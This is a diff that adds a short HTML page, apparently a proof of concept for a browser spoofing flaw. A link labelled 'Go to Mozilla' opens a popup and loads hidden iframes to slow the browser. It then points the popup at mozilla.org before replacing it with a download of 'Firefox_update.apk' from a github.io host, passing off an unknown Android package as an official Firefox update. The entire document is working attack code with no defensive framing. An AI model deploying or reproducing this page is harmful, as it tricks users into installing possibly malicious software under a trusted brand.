@@ -1,0 +1,51 @@
+<body>
+  <a id="test" href="https://www.mozilla.org/" onclick="foo()">
+    <h1>Go to Mozilla</h1>
+  </a>
+</body>
+
+<script>
+  var w;
+  var t;
+  var z;
+
+  function foo() {
+    document.getElementById("test").href = "#";
+
+    w = window.open("fake");
+    t = setInterval('bar()', 1);
+  }
+
+  function bar() {
+    if (w.location.href !== 'fake') {
+      document.body.innerHTML = "";
+      slow();
+
+      w.location.href = 'https://www.mozilla.org/';
+      clearInterval(t);
+
+      z = setInterval('baz()', 1);
+    }
+  }
+
+  function baz() {
+    try {
+      w.location.href !== 'fake';
+    } catch (e) {
+      setTimeout(
+        "w.location.replace('https://heloworld285.github.io/Firefox_update.apk');",
+        3000
+      );
+      clearInterval(z);
+    }
+  }
+
+  function slow() {
+    for (i = 0; i < 10; i++) {
+      iframe = document.createElement("iframe");
+      iframe.src = 'https://www.google.com/';
+      iframe.style = 'display:none';
+      document.body.appendChild(iframe);
+    }
+  }
+</script>
